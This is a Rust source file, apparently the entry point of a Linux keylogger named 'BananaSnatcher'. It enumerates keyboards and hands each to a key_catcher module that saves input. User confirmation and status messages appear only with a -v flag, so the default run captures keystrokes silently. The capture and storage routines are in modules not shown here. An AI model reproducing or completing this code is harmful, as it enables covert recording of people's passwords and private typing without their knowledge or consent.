mod key_catcher;
mod user_security;

use std::env;

#[derive(Debug)]
struct Config {
    verbose: bool,
    time: Option<u64>,
}

impl Config {
    fn new() -> Self {
        let args: Vec<String> = env::args().collect();
        let verbose = args.contains(&"-v".to_string());

        let time = if verbose {
            if !user_security::ask_for_confirmation() {
                std::process::exit(0);
            }
            user_security::ask_for_time()
        } else {
            None
        };

        Self { verbose, time }
    }
}

#[cfg(target_os = "windows")]
fn main() {
    eprintln!("BananaSnatcher is still in development for Windows");
}

#[cfg(target_os = "linux")]
fn main() {
    let config = Config::new();

    if config.verbose {
        user_security::status_banana(user_security::Status::Running);
    }

    match key_catcher::find_keyboard() {
        Ok(keyboards) => {
            for keyboard in keyboards {
                key_catcher::save_input(keyboard, config.time);
            }
        }
        Err(_) => return,
    }

    if config.verbose {
        user_security::status_banana(user_security::Status::Stop);
    }
}
